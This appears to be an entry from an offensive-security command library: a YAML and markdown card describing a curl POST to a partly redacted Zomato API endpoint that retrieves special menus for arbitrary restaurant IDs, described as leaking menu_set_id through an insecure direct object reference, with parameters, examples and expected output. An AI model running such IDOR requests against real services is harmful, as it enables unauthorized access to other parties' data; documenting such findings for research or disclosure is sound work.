---
data: >-
  curl -X POST "https://api.zomato.com/XXX/XXXXX.php" -d
  "user_id=XXXX&type=SPECIAL&request_type=get-special-menus&res_id=XXXXX"
tags:
  - api
  - retrieval
type: command
executor: bash
platforms:
  - Mobile API
id: e36c22a5-f0cb-4ec8-a539-a63c968d9124
created_at: '2025-12-14T17:25:29.716Z'
updated_at: '2025-12-14T17:25:29.716Z'
verified: false
validated: true
submitted: true
---
# Zomato Get Special Menus POST

## Command

```bash
curl -X POST "https://api.zomato.com/XXX/XXXXX.php" \
  -d "user_id=XXXX&type=SPECIAL&request_type=get-special-menus&res_id=XXXXX"
```

## Description

POST request to retrieve special menus for a restaurant, leaking menu_set_id via IDOR.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| user_id | User ID (e.g., XXXX) | Yes |
| type | Menu type (SPECIAL) | Yes |
| request_type | Action (get-special-menus) | Yes |
| res_id | Restaurant ID (arbitrary, XXXXX) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://api.zomato.com/XXX/XXXXX.php" -d "user_id=1234&type=SPECIAL&request_type=get-special-menus&res_id=56789"
```

### Advanced Usage

```bash
# Save output to file
curl -X POST "https://api.zomato.com/XXX/XXXXX.php" -d "user_id=1234&type=SPECIAL&request_type=get-special-menus&res_id=56789" > menus.json
```

## Expected Output

JSON array of menus, e.g., [{"menu_set_id": 999, "name": "Special Offer"}].

## Related

- [[Related Procedure: Retrieve-Special-Menu-IDs]]
